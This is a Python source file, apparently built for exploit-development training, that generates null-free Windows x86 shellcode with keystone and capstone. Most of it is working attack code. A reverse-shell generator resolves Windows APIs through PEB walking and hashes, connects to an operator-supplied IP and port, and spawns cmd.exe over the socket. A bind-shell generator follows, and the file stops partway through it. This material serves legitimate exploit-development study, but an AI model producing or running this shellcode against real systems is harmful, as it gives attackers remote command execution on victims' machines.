#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""This script generates x86 shellcode using keystone-engine/capstone.

Usage:
    PS> py \\tsclient\share\wined\shellcoder.py reverse -a 192.168.0.17
    
Usage (Debugging):
    PS> py \\tsclient\share\wined\shellcoder.py reverse -a 192.168.0.17 --debug
    Then attach to windbg and press enter to continue

Dependencies:
    pip install keystone-engine capstone

References:
 - https://github.com/epi052/osed-scripts/blob/main/shellcoder.py
 - https://github.com/epi052/osed-scripts/blob/main/egghunter.py
 - https://github.com/wry4n/osed-scripts/blob/main/find-bad-chars-sc.py
"""

# Imports
import argparse
import capstone as cs
import ctypes
import keystone as ks
import struct
import os
import platform

# Python2 binding
try:
    input = raw_input
except NameError:
    pass


def hex_byte(byte_str):
    """
    Validate user input as a hex representation of an int between 0 and 255 inclusive.

    Args:
    - byte_str (str or list): The input string or list to be validated.

    Returns:
    - int or list: If input is a valid hex byte string, return the integer value;
                  If input is already a list, assume it's a list of integers and return it.

    Raises:
    - argparse.ArgumentTypeError: If the input is not a valid hex byte string or list of integers.
    """
    if isinstance(byte_str, list):
        # If it's already a list, assume it's a list of integers
        try:
            for val in byte_str:
                if not (0 <= val <= 255):
                    raise ValueError
            return byte_str
        except ValueError:
            raise argparse.ArgumentTypeError("Only *hex* bytes between 00 and ff are valid, found {}".format(byte_str))
    else:
        # If it's a string, process it as before
        if byte_str == "??":
            # WinDBG shows ?? when it can't access a memory region, but we shouldn't stop execution because of it
            return byte_str

        # Remove any spaces from the input string
        byte_str = byte_str.replace(" ", "").replace(",", "").replace("\\x", "").replace("\\", "")

        # Split the input string into two characters each and convert to integers
        bytes_list = [int(byte_str[i : i + 2], 16) for i in range(0, len(byte_str), 2)]

        try:
            for val in bytes_list:
                if not (0 <= val <= 255):
                    raise ValueError

            return bytes_list
        except ValueError:
            raise argparse.ArgumentTypeError("Only *hex* bytes between 00 and ff are valid, found {}".format(byte_str))


def to_hex(s):
    """
    Convert a string to hexadecimal representation.

    Parameters:
    s (str): The input string to be converted.

    Returns:
    str: The hexadecimal representation of the input string.
    """
    retval = list()
    for char in s:
        # Convert each character to its ASCII value and then to hexadecimal representation
        retval.append(hex(ord(char)).replace("0x", ""))
    # Concatenate all hexadecimal representations
    return "".join(retval)


def to_hex_le(s):
    """
    Convert a string to its little-endian hexadecimal representation using struct.pack.

    Args:
        s (str): Input string.

    Returns:
        str: Little-endian hexadecimal representation of the input string.

    Raises:
        ValueError: If the input is not a string.
    """
    import struct

    # Input validation
    if not isinstance(s, str):
        raise ValueError("Input must be a string")

    # Pack the characters into a binary string using little-endian byte order
    packed_data = struct.pack("<" + "B" * len(s), *map(ord, s))

    # Convert the binary string to its hexadecimal representation
    hex_representation = hex(int.from_bytes(packed_data, byteorder="little"))[2:]

    # Add the '0x' prefix
    return "0x" + hex_representation


def format_assembly(asm):
    """
    Format the assembly code to ensure proper alignment.

    Args:
        asm (list): List of strings representing assembly code.

    Returns:
        str: Formatted assembly code.
    """

    def assemble_line(line):
        if line.endswith(":"):  # Named function, leave it as is
            return line
        else:
            return "    " + line

    formatted_asm = []
    for item in asm:
        line = item.strip()  # Remove leading and trailing whitespace
        if not line:  # Skip empty lines
            continue
        elif "\n" in line:
            items = line.split("\n")
            for subitem in items:
                line = subitem.strip()  # Remove leading and trailing whitespace
                if not line:  # Skip empty lines
                    continue
                formatted_asm.append(assemble_line(line))
        else:
            formatted_asm.append(assemble_line(line))
    formatted_asm = "\n".join(formatted_asm)
    return formatted_asm


def to_sin_ip(ip_address):
    """
    Convert an IP address to a hexadecimal representation suitable for a sockaddr_in structure.

    Parameters:
    ip_address (str): The input IP address in dot-decimal notation (e.g., "192.168.1.1").

    Returns:
    str: The hexadecimal representation of the input IP address.
    """
    ip_addr_hex = []
    # Split the IP address into its four octets
    for block in ip_address.split("."):
        # Convert each octet to hexadecimal representation with leading zeros
        ip_addr_hex.append(format(int(block), "02x"))
    # Reverse the order of octets and prepend "0x" to the hexadecimal representation
    ip_addr_hex.reverse()
    ip_addr_hex = "0x" + "".join(ip_addr_hex)
    neg_ip_addr = (~int(ip_addr_hex, 16) + 1) & 0xFFFFFFFF # two's complement
    neg_ip_addr_hex = "0x{:x}".format(neg_ip_addr)
    return neg_ip_addr_hex


def to_sin_port(port):
    """
    Convert a port number to a hexadecimal representation suitable for a sockaddr_in structure.

    Parameters:
    port (int): The input port number.

    Returns:
    str: The hexadecimal representation of the input port number.
    """
    # Convert the port number to hexadecimal representation with leading zeros
    port_hex = format(int(port), "04x")
    # Swap the byte order and prepend "0x" to the hexadecimal representation
    port_hex = "0x" + str(port_hex[2:4]) + str(port_hex[0:2])
    return port_hex


def ror_str(byte, count):
    """
    Rotate the bits of a given byte (as an integer) to the right 'count' number of times.

    Parameters:
    byte (int): The input byte to be rotated.
    count (int): The number of right rotations to perform.

    Returns:
    int: The byte after performing the specified number of right rotations.
    """

    # Convert the byte to a binary string representation with 32 bits, filling with leading zeros if necessary
    binb = format(byte, "032b")

    # Perform right rotation 'count' number of times
    while count > 0:
        # Rotate the binary string to the right by one position
        binb = binb[-1] + binb[0:-1]
        # Decrement the count
        count -= 1

    # Convert the rotated binary string back to an integer
    return int(binb, 2)


def get_function_hash(function_name):
    """
    Generate a hash for a given function name and push it onto the stack.

    The hash is calculated by summing the ASCII values of all characters in the function name and
    performing a right rotation (ROR) operation on the sum.

    Parameters:
    function_name (str): The name of the function.

    Returns:
    str: A string representing the assembly instruction to push the calculated hash onto the stack.
    """
    # Initialize edx and ror_count to 0
    edx = 0
    ror_count = 0

    # Iterate over each character in the function name
    for eax in function_name:
        # Add the ASCII value of the character to edx
        edx = edx + ord(eax)
        # Perform a right rotation (ROR) operation on edx if ror_count is less than the length of function_name - 1
        if ror_count < len(function_name) - 1:
            edx = ror_str(edx, 0xD)
        # Increment ror_count
        ror_count += 1

    # Return the assembly instruction to push the calculated hash onto the stack
    return hex(edx)


def push_string(input_string):
    """
    Convert a string into assembly instructions to push it onto the stack.

    The string is converted to hexadecimal representation, and then assembly instructions
    are generated to push each 4-byte (8-character) chunk of the hexadecimal representation onto the stack.

    Parameters:
    input_string (str): The input string to be converted.

    Returns:
    str: Assembly instructions to push the input string onto the stack.
    """
    # Convert the input string to its hexadecimal representation
    rev_hex_payload = str(to_hex(input_string))
    rev_hex_payload_len = len(rev_hex_payload)

    # Iterate over the hexadecimal representation in reverse order
    instructions = []
    first_instructions = []
    for i in range(rev_hex_payload_len, 0, -1):
        if (i != 0) and ((i % 8) == 0):
            # Add every 4 bytes (8 characters) to one push statement
            target_bytes = rev_hex_payload[i - 8 : i]
            instructions.append("push dword 0x{}".format(target_bytes[6:8] + target_bytes[4:6] + target_bytes[2:4] + target_bytes[0:2]))
        elif (0 == i - 1) and ((i % 8) != 0) and (rev_hex_payload_len % 8) != 0:
            # Handle the leftover instructions
            if rev_hex_payload_len % 8 == 2:
                first_instructions.append("mov al, 0x{}".format(rev_hex_payload[(rev_hex_payload_len - (rev_hex_payload_len % 8)) :]))
                first_instructions.append("push eax")
            elif rev_hex_payload_len % 8 == 4:
                target_bytes = rev_hex_payload[(rev_hex_payload_len - (rev_hex_payload_len % 8)) :]
                first_instructions.append("mov ax, 0x{}".format(target_bytes[2:4] + target_bytes[0:2]))
                first_instructions.append("push eax")
            else:
                target_bytes = rev_hex_payload[(rev_hex_payload_len - (rev_hex_payload_len % 8)) :]
                first_instructions.append("mov al, 0x{}".format(target_bytes[4:6]))
                first_instructions.append("push eax")
                first_instructions.append("mov ax, 0x{}".format(target_bytes[2:4] + target_bytes[0:2]))
                first_instructions.append("push ax")

    # Concatenate the first instructions and the main instructions
    return "\n".join(first_instructions + instructions)


def asm_revshell(rev_ipaddr, rev_port, breakpoint=False):
    """Reverse shell shellcode generator"""
    asm = [
        "start:                              ",
        "{}                                  ".format("int3" if breakpoint else ""),
        "    mov ebp, esp                    ",
        "    add esp, 0xfffff9f0             ",  # Avoiding Null Bytes
        "find_kernel32:                      ",
        "    xor ecx, ecx                    ",  # ECX = 0
        "    mov esi, fs:[ecx+30h]           ",  # ESI = &(PEB) ([FS:0x30])
        "    mov esi, [esi+0Ch]              ",  # ESI = PEB->Ldr
        "    mov esi, [esi+1Ch]              ",  # ESI = PEB->Ldr.InInitOrder
        "next_module:                        ",
        "    mov ebx, [esi+8h]               ",  # EBX = InInitOrder[X].base_address
        "    add esi, 0x1                    ",  # bad chars substitution
        "    add esi, 0x1f                   ",  # bad chars substitution
        "    mov edi, [esi]                  ",  # EDI = InInitOrder[X].module_name
        "    sub esi, 0x1f                   ",  # bad chars substitution
        "    sub esi, 0x1                    ",  # bad chars substitution
        "    mov esi, [esi]                  ",  # ESI = InInitOrder[X].flink (next)
        "    cmp [edi+12*2], cx              ",  # (unicode) modulename[12] == 0x00 / we found kernel32.dll?
        "    jne next_module                 ",  # No: try next module.
        "find_function_shorten:              ",  # Position-Independent Shellcode
        "    jmp find_function_shorten_bnc   ",  # Short jump
        "find_function_ret:                  ",
        "    pop esi                         ",  # POP the return address from the stack
        "    mov [ebp+04h], esi              ",  # Save find_function address for later usage
        "    jmp resolve_symbols_kernel32    ",
        "find_function_shorten_bnc:          ",
        "    call find_function_ret          ",  # Relative CALL with negative offset
        "find_function:                      ",  # Working with the Export Names Array
        "    pushad                          ",  # Save all registers from Base address of kernel32 is in EBX Previous step (find_kernel32)
        "    mov eax, [ebx+3ch]              ",  # Offset to PE Signature
        "    mov edi, [ebx+eax+78h]          ",  # Export Table Directory RVA
        "    add edi, ebx                    ",  # Export Table Directory VMA
        "    mov ecx, [edi+18h]              ",  # NumberOfNames
        "    add edi, 0x1f                   ",  # bad chars substitution
        "    add edi, 0x1                    ",  # bad chars substitution
        "    mov eax, [edi]                  ",  # AddressOfNames RVA
        "    sub edi, 0x1                    ",  # bad chars substitution
        "    sub edi, 0x1f                   ",  # bad chars substitution
        "    add eax, ebx                    ",  # AddressOfNames VMA
        "    mov [ebp-4], eax                ",  # Save AddressOfNames VMA for later
        "find_function_loop:                 ",
        "    jecxz find_function_finished    ",  # Jump to the end if ECX is 0
        "    sub ecx, 0x1                    ",  # Decrement our names counter
        "    mov eax, [ebp-4]                ",  # Restore AddressOfNames VMA
        "    mov esi, [eax+ecx*4]            ",  # Get the RVA of the symbol name
        "    add esi, ebx                    ",  # Set ESI to the VMA of the current
        "compute_hash:                       ",  # Computing Function Name Hashes - Search for the TerminateProcess symbol in the array
        "    xor eax, eax                    ",  # Null EAX
        "    cdq                             ",  # Null EDX
        "    cld                             ",  # Clear direction flag
        "compute_hash_again:                 ",
        "    lodsb                           ",  # Load the next byte from esi into al
        "    test al, al                     ",  # Check for Null terminator
        "    jz compute_hash_finished        ",  # If the ZF is set, we've hit the Null term
        "    ror edx, 0x0c                   ",  # Rotate edx 12 bits to the right
        "    ror edx, 0x01                   ",  # Rotate edx 1 bits to the right
        "    add edx, eax                    ",  # Add the new byte to the accumulator
        "    jmp compute_hash_again          ",  # Next iteration
        "compute_hash_finished:              ",
        "find_function_compare:              ",  # Fetching the VMA of a Function
        "    cmp edx, [esp+24h]              ",  # Compare the computed hash with the requested hash
        "    jnz find_function_loop          ",  # If it doesn't match go back to find_function_loop
        "    mov edx, [edi+24h]              ",  # AddressOfNameOrdinals RVA
        "    add edx, ebx                    ",  # AddressOfNameOrdinals VMA
        "    mov cx, [edx+2*ecx]             ",  # Extrapolate the function's ordinal
        "    mov edx, [edi+1ch]              ",  # AddressOfFunctions RVA
        "    add edx, ebx                    ",  # AddressOfFunctions VMA
        "    mov eax, [edx+4*ecx]            ",  # Get the function RVA
        "    add eax, ebx                    ",  # Get the function VMA
        "    mov [esp+1ch], eax              ",  # Overwrite stack version of eax from pushad
        "find_function_finished:             ",
        "    popad                           ",  # Restore registers
        "    ret                             ",
        "resolve_symbols_kernel32:           ",  # Loading ws2_32.dll and Resolving Symbols
        "    push {}                         ".format(get_function_hash("TerminateProcess")),  # TerminateProcess hash
        "    call dword ptr [ebp+04h]        ",  # Call find_function
        "    mov [ebp+10h], eax              ",  # Save TerminateProcess address for later
        "    push {}                         ".format(get_function_hash("LoadLibraryA")),  # LoadLibraryA hash
        "    call dword ptr [ebp+04h]        ",  # Call find_function
        "    mov [ebp+14h], eax              ",  # Save LoadLibraryA address for later
        "    push {}                         ".format(get_function_hash("CreateProcessA")),  # CreateProcessA hash
        "    call dword ptr [ebp+04h]        ",  # Call find_function
        "    mov [ebp+18h], eax              ",  # Save CreateProcessA address for later
        "load_ws2_32:                        ",
        "    xor eax, eax                    ",  # Null EAX
        "    mov ax, 0x6c6c                  ",  # Move the end of the string in AX (ESP = "ll")
        "    push eax                        ",  # Push EAX on the stack with string Null terminator
        "    push dword 0x642e3233           ",  # Push part of the string on the stack (ESP = "32.dll")
        "    push dword 0x5f327377           ",  # Push another part of the string on the stack (ESP = "ws2_32.dll")
        "    push esp                        ",  # Push ESP to have a pointer to the string (ESP = &("ws2_32.dll"))
        "    call dword ptr [ebp+14h]        ",  # Call LoadLibraryA
        "resolve_symbols_ws2_32:             ",  # Loading ws2_32.dll and Resolving Symbols
        "    mov ebx, eax                    ",  # Move the base address of ws2_32.dll to EBX
        "    push {}                         ".format(get_function_hash("WSAStartup")),  # WSAStartup hash
        "    call dword ptr [ebp+04h]        ",  # Call find_function
        "    mov [ebp+1Ch], eax              ",  # Save WSAStartup address for later usage
        "    push {}                         ".format(get_function_hash("WSASocketA")),  # WSASocketA hash
        "    call dword ptr [ebp+04h]        ",  # Call find_function
        "    mov [ebp+2ch], eax              ",  # Save WSASocketA address for later usage
        "    push {}                         ".format(get_function_hash("WSAConnect")),  # WSAConnect hash
        "    call dword ptr [ebp+04h]        ",  # Call find_function
        "    mov [ebp+24h], eax              ",  # Save WSAConnect address for later usage
        "call_wsastartup:                    ",  # Calling WSAStartup - Windows Sockets
        "    push esp                        ",  # bad chars
        "    pop eax                         ",  # bad chars
        "    xor ecx, ecx                    ",
        "    mov cx, 0x590                   ",  # Move 0x590 to CX
        "    sub eax, ecx                    ",  # Substract CX from EAX to avoid overwriting the structure later
        "    push eax                        ",  # Push lpWSAData
        "    xor eax, eax                    ",  # Null EAX
        "    mov ax, 0x0202                  ",  # Move version to AX
        "    push eax                        ",  # Push wVersionRequired
        "    call dword ptr [ebp+1Ch]        ",  # Call WSAStartup
        "call_wsasocketa:                    ",  # Calling WSASocketA(AF_INET = 2, SOCK_STREAM = 1, TCP = 6, Null, Null, Null ) - Create a new socket
        "    xor eax, eax                    ",  # Null EAX
        "    push eax                        ",  # Push dwFlags
        "    push eax                        ",  # Push g
        "    push eax                        ",  # Push lpProtocolInfo
        "    mov al, 0x06                    ",  # Move AL, IPPROTO_TCP
        "    push eax                        ",  # Push protocol
        "    sub al, 0x05                    ",  # Substract 0x05 from AL, AL = 0x01
        "    push eax                        ",  # Push type
        "    inc eax                         ",  # Increase EAX, EAX = 0x02
        "    push eax                        ",  # Push af
        "    call dword ptr [ebp+2ch]        ",  # Call WSASocketA
        "call_wsaconnect:                    ",  # Calling WSAConnect
        "    mov esi, eax                    ",  # Move the SOCKET descriptor to ESI
        "    xor edx, edx                    ",  # Null EDX
        "    push edx                        ",  # Push sin_zero[]
        "    push edx                        ",  # Push sin_zero[]
        "    mov eax, {}                     ".format(to_sin_ip(rev_ipaddr)),  # Push sin_addr (example: 192.168.0.218)
        "    neg eax                         ",  # Negate value for bad character prevention
        "    push eax                        ",  # Push ip address value to stack
        "    mov dx, {}                      ".format(to_sin_port(rev_port)),  # Move the sin_port (example: 443) to AX
        "    shl edx, 0x10                   ",  # Left shift EAX by 0x10 bytes
        "    add dx, 0x02                    ",  # Add 0x02 (AF_INET) to AX
        "    push edx                        ",  # Push sin_port & sin_family
        "    push esp                        ",  # Push pointer to the sockaddr_in structure
        "    pop edi                         ",  # Store pointer to sockaddr_in in EDI
        "    xor eax, eax                    ",  # Null EAX
        "    push eax                        ",  # Push lpGQOS
        "    push eax                        ",  # Push lpSQOS
        "    push eax                        ",  # Push lpCalleeData
        "    push eax                        ",  # Push lpCalleeData
        "    add al, 0x10                    ",  # Set AL to 0x10
        "    push eax                        ",  # Push namelen
        "    push edi                        ",  # Push *name
        "    push esi                        ",  # Push s
        "    call dword ptr [ebp+24h]        ",  # Call WSAConnect
        "create_startupinfoa:                ",  # Calling CreateProcessA
        "    push esi                        ",  # Push hStdError
        "    push esi                        ",  # Push hStdOutput
        "    push esi                        ",  # Push hStdInput
        "    xor eax, eax                    ",  # Null EAX
        "    push eax                        ",  # Push lpReserved2
        "    push eax                        ",  # Push cbReserved2 & wShowWindow
        "    mov al, 0x80                    ",  # Move 0x80 to AL
        "    xor ecx, ecx                    ",  # Null ECX
        "    mov cl, 0x80                    ",  # Move 0x80 to CL
        "    add eax, ecx                    ",  # Set EAX to 0x100
        "    push eax                        ",  # Push dwFlags
        "    xor eax, eax                    ",  # Null EAX
        "    push eax                        ",  # Push dwFillAttribute
        "    push eax                        ",  # Push dwYCountChars
        "    push eax                        ",  # Push dwXCountChars
        "    push eax                        ",  # Push dwYSize
        "    push eax                        ",  # Push dwXSize
        "    push eax                        ",  # Push dwY
        "    push eax                        ",  # Push dwX
        "    push eax                        ",  # Push lpTitle
        "    push eax                        ",  # Push lpDesktop
        "    push eax                        ",  # Push lpReserved
        "    mov al, 0x44                    ",  # Move 0x44 to AL
        "    push eax                        ",  # Push cb
        "    push esp                        ",  # Push pointer to the STARTUPINFOA structure
        "    pop edi                         ",  # Store pointer to STARTUPINFOA in EDI
        "create_cmd_string:                  ",
        "    mov eax, 0xff9a879b             ",  # Move 0xff9a879b into EAX
        "    neg eax                         ",  # Negate EAX, EAX = 00657865
        "    push eax                        ",  # Push part of the "cmd.exe" string
        "    push 0x2e646d63                 ",  # Push the remainder of the "cmd.exe"
        "    push esp                        ",  # Push pointer to the "cmd.exe" string
        "    pop ebx                         ",  # Store pointer to the "cmd.exe" string
        "call_createprocessa:                ",
        "    push esp                        ",  # bad chars
        "    pop eax                         ",  # bad chars
        "    xor ecx, ecx                    ",  # Null ECX
        "    mov cx, 0x390                   ",  # Move 0x390 to CX
        "    sub eax, ecx                    ",  # Substract CX from EAX to avoid overwriting the structure later
        "    push eax                        ",  # Push lpProcessInformation
        "    push edi                        ",  # Push lpStartupInfo
        "    xor eax, eax                    ",  # Null EAX
        "    push eax                        ",  # Push lpCurrentDirectory
        "    push eax                        ",  # Push lpEnvironment
        "    push eax                        ",  # Push dwCreationFlags
        "    inc eax                         ",  # Increase EAX, EAX = 0x01 (TRUE)
        "    push eax                        ",  # Push bInheritHandles
        "    dec eax                         ",  # Null EAX
        "    push eax                        ",  # Push lpThreadAttributes
        "    push eax                        ",  # Push lpProcessAttributes
        "    push ebx                        ",  # Push lpCommandLine
        "    push eax                        ",  # Push lpApplicationName
        "    call dword ptr [ebp+18h]        ",  # Call CreateProcessA
        "call_terminate_process:             ",
        "    xor ecx, ecx                    ",  # Null ECX
        "    push ecx                        ",  # uExitCode
        "    push 0xffffffff                 ",  # HANDLE hProcess
        "    call dword ptr [ebp+10h]        ",  # Call TerminateProcess
    ]
    asm = format_assembly(asm)
    return asm


def asm_bindshell(rev_port, breakpoint=False):
    """Bind shell shellcode generator
    Windows/x86 bind TCP shellcode / dynamic PEB and EDT method null-free shellcode. This a bind tcp shellcode that open a listen socket on 0.0.0.0 and port 1337. In order to accomplish this task the shellcode uses the PEB method to locate the baseAddress of the required module and the Export Directory Table to locate symbols. Also the shellcode uses a hash function to gather dynamically the required symbols without worry about the length.
    # Ref: https://packetstormsecurity.com/files/164427/Windows-x86-Bind-TCP-Shellcode.html
    """

    asm = [
        "start:                              ",
        "     {}                             ".format("int3" if breakpoint else ""),
        "    mov ebp, esp                    ",
        "    add esp, 0xfffff9f0             ",  # Avoid Null-bytes and stack clobbering
        "find_kernel32:                      ",
        "    xor ecx, ecx                    ",  # Null ECX
        "    mov esi, fs:[ecx+30h]           ",  # ESI = &(PEB) ([FS:0x30])
        "    mov esi, [esi+0Ch]              ",  # ESI = PEB->Ldr
        "    mov esi, [esi+1Ch]              ",  # ESI = PEB->Ldr.InInitOrder
        "next_module:                        ",
        "    mov ebx, [esi+08h]              ",  # EBX = InInitOrder[X].base_address
        "    mov edi, [esi+20h]              ",  # EDI = InInitOrder[X].module_name
        "    mov esi, [esi]                  ",  # ESI = InInitOrder[X].flink (next module)
        "    cmp [edi+12*2], cx              ",  # (unicode) module_name[12] == 0x00 / we found kernel32.dll?
        "    jne next_module                 ",  # No: try next module
        "find_function_shorten:              ",  # Position-Independent Shellcode
        "    jmp find_function_shorten_bnc   ",  # Short jump
        "find_function_ret:                  ",
        "    pop esi                         ",  # ESI = POP return addres
        "    mov [ebp+04h], esi              ",  # Save find_function address for later usage
        "    jmp resolve_symbols_kernel32    ",
        "find_function_shorten_bnc:          ",
        "    call find_function_ret          ",  # Call fund_function_ret PUSH ret address into the stack
        "find_function:                      ",
        "    pushad                          ",  # Save all registers
        "    mov eax, [ebx+3ch]              ",  # Offset of PE signature
        "    mov edi, [ebx+eax+78h]          ",  # Export Table Directory RVA
        "    add edi, ebx                    ",  # Export Table Directory VMA
        "    mov ecx, [edi+18h]              ",  # NumberOfNames
        "    mov eax, [edi+20h]              ",  # AddressOfNames RVA
        "    add eax, ebx                    ",  # AddresOfNames VMA
        "    mov [ebp-4], eax                ",  # Save AddressOfName VMA for later usage
        "find_function_loop:                 ",
        "    jecxz find_function_finished    ",  # Jump to the end if ECX is 0
        "    sub ecx, 0x1                    ",  # Decrement our names counter
        "    mov eax, [ebp-4]                ",  # Restore AddressOfNames VMA
        "    mov esi, [eax+ecx*4]            ",  # Get the RVA of the symbol name
        "    add esi, ebx                    ",  # Set ESI to the VMA of the current symbol name
        "compute_hash:                       ",  # Computing Function Name Hashes - Search for the TerminateProcess symbol in the array
        "    xor eax, eax                    ",  # Null EAX
        "    cdq                             ",  # Null EDX
        "    cld                             ",  # Clear direction flag
        "compute_hash_again:                 ",
        "    lodsb                           ",  # Load the next bytes from ESI into al
        "    test al, al                     ",  # Check for Null terminator
        "    jz compute_hash_finished        ",  # If the ZF is set, we've hit the Null term
        "    ror edx, 0x0c                   ",  # Rotate edx 12 bits to the right
        "    ror edx, 0x01                   ",  # Rotate edx 1 bits to the right
        "    add edx, eax                    ",  # Add the new byte to the accumulator
        "    jmp compute_hash_again          ",  # Next iteration
        "compute_hash_finished:              ",
        "find_function_compare:              ",  # Fetching the VMA of a Function
        "    cmp edx, [esp+24h]              ",  # Compare the computed hash with the requested hash
        "    jnz find_function_loop          ",  # If it doesn't match go back to find_function_loop
        "    mov edx, [edi+24h]              ",  # AddressOfNameOrdinals RVA
        "    add edx, ebx                    ",  # AddressOfNameOrdinals VMA
        "    mov cx, [edx+2*ecx]             ",  # Extrapolate the function's ordinal
        "    mov edx, [edi+1ch]              ",  # AddressOfFunctions RVA
        "    add edx, ebx                    ",  # AddressOfFunctions VMA
        "    mov eax, [edx+4*ecx]            ",  # Get the function RVA
        "    add eax, ebx                    ",  # Get the function VMA
        "    mov [esp+1ch], eax              ",  # Overwrite stack version of eax from pushad
        "find_function_finished:             ",
        "    popad                           ",  # Restore registers
        "    ret                             ",
        "resolve_symbols_kernel32:           ",  # Loading ws2_32.dll and Resolving Symbols
        "    push {}                         ".format(get_function_hash("TerminateProcess")),  # TerminateProcess hash
        "    call dword ptr [ebp+04h]        ",  # Call find_function
        "    mov [ebp+10h], eax              ",  # Save TerminateProcess address for later
        "    push {}                         ".format(get_function_hash("LoadLibraryA")),  # LoadLibraryA hash
        "    call dword ptr [ebp+04h]        ",  # Call find_function
        "    mov [ebp+14h], eax              ",  # Save LoadLibraryA address for later
        "    push {}                         ".format(get_function_hash("CreateProcessA")),  # CreateProcessA hash
        "    call dword ptr [ebp+04h]        ",  # Call find_function
        "    mov [ebp+18h], eax              ",  # Save CreateProcessA address for later usage
        "load_ws2_32:                        ",
        "    xor eax, eax                    ",  # Null EAX
        "    mov ax, 0x6c6c                  ",  # EAX = 0x6c6c
        "    push eax                        ",  # ESP = "ll"
        "    push dword 0x642e3233           ",  # ESP = "32.dll"
        "    push dword 0x5f327377           ",  # ESP = "ws2_32.dll"
        "    push esp                        ",  # ESP = &("ws2_32.dll")
        "    call dword ptr [ebp+14h]        ",  # Call LoadLibraryA
        "resolve_symbols_ws2_32:             ",
        "    mov ebx, eax                    ",  # Move the base address of ws2_32.dll to EBX
        "    push {}                         ".format(get_function_hash("WSAStartup")),  # WSAStartup hash
        "    call dword ptr  [ebp+04h]       ",  # Call find_function
        "    mov [ebp+1Ch], eax              ",  # Save WSAStartup address for later usage
        "    push {}                         ".format(get_function_hash("WSASocketA")),  # WSASocketA hash
        "    call dword ptr [ebp+04h]        ",  # Call find_function
        "    mov [ebp+20h], eax              ",  # Save WSASocketA address for later usage
        "    push {}                         ".format(get_function_hash("bind")),  # Bind hash
        "    call dword ptr [ebp+04h]        ",  # Call find_function
        "    mov [ebp+24h], eax              ",  # Save Bind address for later usage
        "    push {}                         ".format(get_function_hash("listen")),  # listen hash
        "    call dword ptr  [ebp+04h]       ",  # Call find_function
        "    mov [ebp+28h], eax              ",  # Save listen address for later usage
        "    push {}                         ".format(get_function_hash("WSAGetLastError")),  # WSAGetLastError hash
        "    call dword ptr [ebp+04h]        ",  # Call find_function
        "    mov [ebp+32h], eax              ",  # Save WSAGetLastError address for later usage
        "    push {}                         ".format(get_function_hash("accept")),  # accept hash
        "    call dword ptr  [ebp+04h]       ",  # Call find_function
        "    mov [ebp+36h], eax              ",  # Save acccept address for later usage
        "call_wsastartup:                    ",  # Calling WSAStartup - Windows Sockets
        "    mov eax, esp                    ",  # Move ESP to EAX
        "    mov cx, 0x590                   ",  # Move 0x590 to CX
        "    sub eax, ecx                    ",  # Substract CX from EAX to avoid overwriting the structure later
        "    push eax                        ",  # Push lpWSAData
        "    xor eax, eax                    ",  # Null EAX
        "    mov ax, 0x0202                  ",  # Move version to AX
        "    push eax                        ",  # Push wVersionRequired (0x00000202)
        "    call dword ptr [ebp+1Ch]        ",  # Call WSAStartup(WORD wVersionRequired, LPWSADATA lpWSAData)
        "call_wsasocketa:                    ",  # Calling WSASocketA(AF_INET = 2, SOCK_STREAM = 1, TCP = 6, Null, Null, Null ) - Create a new socket
        "    xor eax, eax                    ",  # Null EAX
        "    push eax                        ",  # Push dwFlags
        "    push eax                        ",  # Push g
        "    push eax                        ",  # Push lpProtocolInfo
        "    mov al, 0x06                    ",  # Move AL, IPPROTO_TCP
        "    push eax                        ",  # Push protocol
        "    sub al, 0x05                    ",  # Substract 0x05 from AL, AL = 0x01
        "    push eax                        ",  # Push type
        "    inc eax                         ",  # Increase EAX, EAX = 0x02
        "    push eax                        ",  # Push af
        "    call dword ptr [ebp+20h]        ",  # Call WSASocketA(2, 1, 6, 0, 0, 0)
        "create_sockaddr_in_struct:          ",  # sockaddr_in {AF_INET = 2; p1337 = 0x3905; INADDR_ANY = 0x5D00A8C0}
        "    mov esi, eax                    ",  # Move the SOCKET descriptor to ESI
        "    xor eax, eax                    ",  # Null EAX
        "    push eax                        ",  # Push sin_addr (any address 0.0.0.0)
        "    mov ax, {}                      ".format(to_sin_port(rev_port)),  # Move the sin_port (example: 443) to AX
        "    shl eax, 0x10                   ",  # Left shift EAX by 0x10 bytes (EAX = 0x39050000)
        "    add ax, 0x02                    ",  # Add 0x02 (AF_INET) to AX
        "    push eax                        ",  # Push sin_port & sin_family
        "    push esp                        ",  # Push pointer to the sockaddr_in structure
        "    pop edi                         ",  # EDI = &(sockaddr_in)
        "call_bind:                          ",  # bind(SOCKET *s = ESI, const sockaddr *addr = EDI, int  namelen = 0x16)
        "    xor eax, eax                    ",  # Null EAX
        "    add al, 0x16                    ",  # Set AL to 0x16
        "    push eax                        ",  # Push namelen
        "    push edi                        ",  # Push *addr
        "    push esi                        ",  # Push s
        "    call dword ptr [ebp+24h]        ",  # Call bind
        "call_wsagetlaserror:                ",  # WSAGetLastError() (just for debugging purpouse)
        "    call dword ptr [ebp+32h]        ",  # Call WSAGetLastError
        "call_listen:                        ",
        "    xor eax, eax                    ",  # Null EAX
        "    push eax                        ",  # Push backlog
        "    push esi                        ",  # Push s
        "    call dword ptr [ebp+28h]        ",  # Call WS2_32!listen
        "call_accept:                        ",  # accept( SOCKET s, sockaddr *addr, int *addrlen)
        "    xor eax, eax                    ",  # Null EAX
        "    push eax                        ",  # Push *addrlen (optional)
        "    push eax                        ",  # Push *addr    (optional)
        "    push esi                        ",  # Push socket HANDLE from WSASocketA()
        "    call dword ptr [ebp+36h]        ",  # Call accept(SOCKET s , Null, Null)
        "create_startupinfoa:                ",
        "    mov esi, eax                    ",  # Save Handle returned from accept() into ESI
        "    push esi                        ",  # Push hStdError
        "    push esi                        ",  # Push hStdOutput
        "    push esi                        ",  # Push hStdInput
        "    xor eax, eax                    ",  # Null EAX
        "    push eax                        ",  # Push lpReserved2
        "    push eax                        ",  # Push cbReserved2 & wShowWindow
        "    mov al, 0x80                    ",  # Move 0x80 to AL
        "    xor ecx, ecx                    ",  # Null ECX
        "    mov cl, 0x80                    ",  # Move 0x80 to CL
        "    add eax, ecx                    ",  # Set EAX to 0x100
        "    push eax                        ",  # Push dwFlags
        "    xor eax, eax                    ",  # Null EAX
        "    push eax                        ",  # Push dwFillAttribute
        "    push eax                        ",  # Push dwYCountChars
        "    push eax                        ",  # Push dwXCountChars
        "    push eax                        ",  # Push dwYSize
        "    push eax                        ",  # Push dwXSize
        "    push eax                        ",  # Push dwY
        "    push eax                        ",  # Push dwX
        "    push eax                        ",  # Push lpTitle
        "    push eax                        ",  # Push lpDesktop
        "    push eax                        ",  # Push lpReserved
        "    mov al, 0x44                    ",  # Move 0x44 to AL
